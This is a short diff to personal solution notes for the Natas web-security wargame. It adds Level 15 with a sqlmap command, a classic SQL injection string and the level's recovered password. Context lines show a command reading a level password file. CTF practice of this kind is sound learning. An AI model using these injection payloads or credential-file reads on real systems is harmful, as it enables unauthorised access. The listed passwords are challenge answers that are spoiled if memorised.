@@ -48,4 +48,12 @@
 * cat /etc/natas_webpass/natas14
 * Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
+#### Level15
+>	 sqlmap -r r.req -p password
+>	 " or "1"="1
+* AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+#### Level16
+
+
 
